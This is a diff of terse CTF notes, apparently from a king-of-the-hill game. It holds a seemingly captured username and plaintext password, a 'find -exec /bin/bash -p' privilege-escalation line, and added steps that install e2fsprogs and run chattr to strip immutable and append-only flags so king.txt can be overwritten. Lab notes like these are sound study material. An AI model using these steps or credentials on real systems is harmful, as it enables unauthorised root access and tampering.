@@ -100,6 +100,7 @@ indexsqlite_autoindex_users_1users
 	bobba
 '''
 
+
 '''
 user:bobba
 passwd:-`G)8(t/NDkZ"u^{
@@ -112,11 +113,24 @@ passwd:-`G)8(t/NDkZ"u^{
 find . -exec /bin/bash -p \; -quit
 '''
 
+
+
+
+*get chattr on the box
 '''
-*cant write to king.txt but appending works
-echo 'username' >> king.txt
+download from:
+https://packages.debian.org/jessie/amd64/e2fsprogs/download
+
+*scp package over
+
+dpkg -i e2fsprogs_1.42.12-2+deb8u2_amd64.deb
+
+chattr -i king.txt
+
+chattr -a king.txt
+
+echo "User" > king.txt
 '''
-		
 
 
 
